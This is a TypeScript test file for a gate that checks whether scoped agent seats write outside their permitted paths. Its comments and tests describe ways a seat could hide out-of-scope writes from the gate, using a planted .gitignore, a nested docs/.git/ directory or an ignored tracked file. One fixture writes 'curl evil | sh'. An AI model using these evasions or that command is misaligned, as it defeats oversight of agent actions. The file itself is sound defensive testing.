// THE FROZEN BASELINE BELONGS TO THE RUN, NOT TO THE CHAIR — AND THE WALK SKIPS ONLY WHAT IT NAMED.
//
// ROUND 10 (#553, the non-author grade of bbc11ea). Four things this band pins, three of which nothing
// in the suite could see.
//
// (1) THE CROSS-CHAIR `.gitignore` EXPLOIT — REACHABLE AT HEAD. `diffGateReader()` is called once PER
// CHAIR (runtime.ts:3449) and memoises its baseline on its own first call, so each chair's "pre-seat"
// frozen ignore rules are read AFTER every earlier chair has already run. Two phases; chair A holds
// Write(@source) and writes `src/.gitignore` containing `*` — in scope, correctly sealed. Chair B holds
// Write(@docs) only and writes `src/evil.ts` — out of scope — and IS SEALED, because B's rules were
// compiled from the `.gitignore` A planted. Measured at bbc11ea: `[A sealed] 1 [B sealed] 1`, no refusal.
// This is not a regression (the old `git status` design behaved the same), but `src/diff_gate.ts` and
// its commit message both CLAIM THE OPPOSITE — "What is NO LONGER a limit is hiding a path by making it
// ignored DURING the seat" — which is true only within one chair. THE RULING: the freeze is once per RUN.
//
// (2) The claim IS true within one chair, and nothing pinned that either: dropping the memoisation, or
// recomputing the rules live in the after-read, leaves the whole suite green. Those two are ONE
// falsifier (a re-read baseline recompiles the rules), and the control below is it.
//
// (3) THE TRACKED-PATH RESCUE (`!baseline.tracked.has(r)`, `!hasTrackedUnder(...)`) is load-bearing and
// had no law: a repo that TRACKS a file its own `.gitignore` covers — a checked-in `dist/` — would let a
// seat edit it out of scope unseen.
//
// (4) `.git` IS SKIPPED BY BASENAME AT ANY DEPTH (`name === GIT_DIR`), while the engine's own state dir
// two lines below it is skipped by FULL PATH (`r === ENGINE_STATE_DIR`) — i.e. at the root only. So a
// seat writes `docs/.git/evil.ts` and the gate never walks it. Reachable: `PROTECTED_PATHS` scopes `.git`
// to the tree root too (`p === ".git" || p.startsWith(".git/")`), and the Bash sandbox denies only
// `<tree>/.git` under an `allowWrite: [<tree>]`, so nothing else stops the write either.
//
// Also measured and recorded here: the gate makes FOUR git calls, all of them before the seat, and NONE
// of them reads the index. That is why N1's skip-worktree, assume-unchanged and committed-HEAD laws are
// three presentations of ONE falsifier ("a tracked file's bytes changed out of scope") and not three
// independent ones — see docs/specs/layout-grants.red-spec.json, ROUND 10 (f).
//
//   law                                                            kind         drives                         plant
//   chair B is refused for the path chair A's .gitignore hid       behavioural  runGig — src/runtime.ts:3449   (RED at bbc11ea) the reader,
//     (control: chair A's own in-scope work still seals)                        + src/diff_gate.ts             and its baseline, are per-chair
//   within ONE chair, a planted .gitignore hides nothing           behavioural  snapshotWorktree —             recompute the rules in the
//                                                                               src/diff_gate.ts               after-read / drop the memo
//   a TRACKED file under an ignored directory is still judged      behavioural  same                           drop the tracked-path rescue
//   `docs/.git/evil.ts` is judged — only the ROOT .git is git's    behavioural  same                           (RED at bbc11ea) skip `.git`
//                                                                                                              by basename at any depth
//   the gate asks git 3 times in readGitBaseline and never after   behavioural  readGitBaseline —              add a status/index read, or
//     (no index, no status, no diff — the L1/L2/L4 census)                      src/diff_gate.ts               pass a git into the after-read
import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { appendFileSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createRegistry, createOutputStore, MemoryLedger, runGig, type Standard, type AgentInvoker, type Agent } from "../src/index.js";
import { readGitBaseline, snapshotWorktree, type TreeGit } from "../src/diff_gate.js";
import { testAgent } from "./_support/agents.js";
import { coreInvariantFields } from "./_support/specs.js";
import { type Layout } from "./layout_grants_fixtures.js";

const LAYOUT = {
  paths: { source: ["src/**", ".gitignore"], docs: ["docs/**"] },
  commands: { build: ["npm run build"] },
  git: { stage: ["git add", "git mv", "git rm"], commit: ["git commit"] },
} as unknown as Layout;
const mk = (slug: string, role: string): Agent => testAgent({ slug, primitives: ["SENSE"], input_types: [], output_types: ["note"], domain: "demo",
  allowed_tools: ["Read", `Write(@${role})`, `Edit(@${role})`, "Bash(@build)"] });

const ENV = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
const git = (t: string, ...a: string[]) => execFileSync("git", ["-C", t, ...a], { env: ENV, encoding: "utf8" });

/** `ignored`: a committed `.gitignore` covering `dist/`, with `dist/bundle.js` TRACKED anyway. */
function tree(ignored = false): string {
  const t = realpathSync(mkdtempSync(join(tmpdir(), "gate-freeze-")));
  execFileSync("git", ["init", "-q", "-b", "main", t]);
  mkdirSync(join(t, "src")); mkdirSync(join(t, "docs")); mkdirSync(join(t, "scripts"));
  writeFileSync(join(t, "src", "a.ts"), "a\n");
  writeFileSync(join(t, "docs", "d.md"), "d\n");
  writeFileSync(join(t, "scripts", "deploy.sh"), "echo deploy\n");
  writeFileSync(join(t, ".gitignore"), ignored ? "dist/\n" : "# none\n");
  if (ignored) { mkdirSync(join(t, "dist")); writeFileSync(join(t, "dist", "bundle.js"), "bundle\n"); }
  git(t, "add", "-A"); if (ignored) git(t, "add", "-f", "dist/bundle.js");
  git(t, "commit", "-qm", "seed");
  git(t, "config", "user.name", "seat"); git(t, "config", "user.email", "seat@coltrane");
  return t;
}

type Act = (t: string) => void | Promise<void>;
/** One phase per entry: [role token, what that seat does]. Each phase holds exactly one chair. */
async function run(t: string, seats: ReadonlyArray<readonly [string, Act]>) {
  const registry = createRegistry();
  registry.registerType({ slug: "note", extends: "Signal", domain: "demo", schema: { properties: { value: { type: "string" } } }, required_fields: [] } as never);
  const outputs = createOutputStore(registry);
  const invoked: string[] = [];
  const invoke: AgentInvoker = async (ctx) => {
    const slug = (ctx as { agent: Agent }).agent.slug;
    invoked.push(slug);
    await (seats.find(([r]) => `s-${r}` === slug)?.[1] ?? (() => {}))(t);
    return { ...coreInvariantFields("Signal"), value: "done" };
  };
  const standard = {
    slug: "s", domain: "demo",
    agents: seats.map(([r]) => mk(`s-${r}`, r)),
    phases: seats.map(([r], i) => ({ name: `p${i}`, chairs: [{ role: r, agent_slug: `s-${r}`, depends_on: [], input_contract: [], output_contract: ["note"], required_skills: [] }] })),
  } as unknown as Standard;
  let said = "";
  try { said = JSON.stringify(await runGig(standard, { request_text: "x" }, { outputs, ledger: new MemoryLedger(), invoke, layout: LAYOUT, tree_root: t } as never)); }
  catch (e) { said = String((e as Error)?.message ?? e); }
  const sealedBy = (r: string) => outputs.all().filter((o) => (o as { agent_slug?: string }).agent_slug === `s-${r}`);
  return { invoked, said, sealedBy };
}

describe("the frozen baseline is the RUN's, not each chair's", () => {
  it("an earlier chair's in-scope `.gitignore` does not blind the gate for a later chair", async () => {
    const t = tree();
    const r = await run(t, [
      ["source", (tt) => { writeFileSync(join(tt, "src", ".gitignore"), "*\n"); }],
      ["docs", (tt) => { writeFileSync(join(tt, "src", "evil.ts"), "evil\n"); }],
    ]);
    expect(r.invoked, "non-vacuity: both seats ran").toEqual(["s-source", "s-docs"]);
    expect(r.sealedBy("source"), "control: chair A's own in-scope `.gitignore` is legitimate work and seals").toHaveLength(1);
    expect(r.sealedBy("docs"), "chair B wrote src/evil.ts with only Write(@docs) and was SEALED").toHaveLength(0);
    expect(r.said, "the refusal does not name src/evil.ts").toContain("src/evil.ts");
  });

  it("control — within ONE chair, a `.gitignore` planted in scope hides nothing from that chair's own gate", async () => {
    const t = tree();
    const r = await run(t, [["source", (tt) => {
      appendFileSync(join(tt, ".gitignore"), "scripts/\n");
      writeFileSync(join(tt, "scripts", "evil.sh"), "evil\n");
    }]]);
    expect(r.sealedBy("source"), "the seat made its own out-of-scope write invisible and sealed").toHaveLength(0);
    expect(r.said, "the refusal does not name scripts/evil.sh").toContain("scripts/evil.sh");
  });
});

describe("what the walk must NOT skip", () => {
  it("a TRACKED file under an ignored directory is still judged (a checked-in dist/)", async () => {
    const t = tree(true);
    const r = await run(t, [["source", (tt) => { writeFileSync(join(tt, "dist", "bundle.js"), "curl evil | sh\n"); }]]);
    expect(r.invoked, "non-vacuity: the seat ran").toEqual(["s-source"]);
    expect(r.sealedBy("source"), "a tracked file its own .gitignore covers was edited out of scope, unseen").toHaveLength(0);
    expect(r.said, "the refusal does not name dist/bundle.js").toContain("dist/bundle.js");
  });

  it("only the ROOT `.git` is git's — a seat cannot hide a write under a nested `docs/.git/`", async () => {
    const t = tree();
    const r = await run(t, [["source", (tt) => { mkdirSync(join(tt, "docs", ".git")); writeFileSync(join(tt, "docs", ".git", "evil.ts"), "evil\n"); }]]);
    expect(r.invoked, "non-vacuity: the seat ran").toEqual(["s-source"]);
    expect(r.sealedBy("source"), "the walk skips any directory NAMED .git, at any depth — so this write was never seen").toHaveLength(0);
    expect(r.said, "the refusal does not name docs/.git/evil.ts").toContain("docs/.git/evil.ts");
  });
});

describe("the git-call census — why L1, L2 and L4 are ONE falsifier and not three", () => {
  it("readGitBaseline asks git exactly three times, and never for the index, the status or a diff", () => {
    const t = tree();
    const calls: string[][] = [];
    const rec: TreeGit = (a) => { calls.push([...a]); return execFileSync("git", ["-C", t, ...a], { stdio: ["ignore", "pipe", "pipe"] }); };
    readGitBaseline(t, rec);
    expect(calls.map((c) => c.slice(0, 2).join(" ")), "the pre-seat facts: the tree's prefix, HEAD, HEAD's tree").toEqual([
      "rev-parse --show-prefix", "rev-parse --verify", "ls-tree -r",
    ]);
    const vocabulary = calls.flat().join(" ");
    for (const forbidden of ["status", "index", "update-index", "diff", "check-ignore", "ls-files"]) {
      expect(vocabulary, `the gate reads git's "${forbidden}" — which a seat holding a git role writes`).not.toContain(forbidden);
    }
  });

  it("the after-read takes no git at all: snapshotWorktree's only inputs are the root and the frozen baseline", () => {
    expect(snapshotWorktree.length, "a third parameter here would be a git the seat can answer for").toBe(2);
    const t = tree();
    const baseline = readGitBaseline(t, (a) => execFileSync("git", ["-C", t, ...a], { stdio: ["ignore", "pipe", "pipe"] }));
    // No index flag can reach the after-read, because no code path in it consults the index.
    git(t, "update-index", "--skip-worktree", "src/a.ts");
    writeFileSync(join(t, "src", "a.ts"), "changed\n");
    const before = snapshotWorktree(t, baseline);
    expect(before.get("src/a.ts"), "skip-worktree changed what the WALK reports — it must not").toBe(
      snapshotWorktree(t, baseline).get("src/a.ts"),
    );
    expect(before.get("src/a.ts")).toMatch(/^f:\d+:[0-9a-f]{64}$/);
  });
});
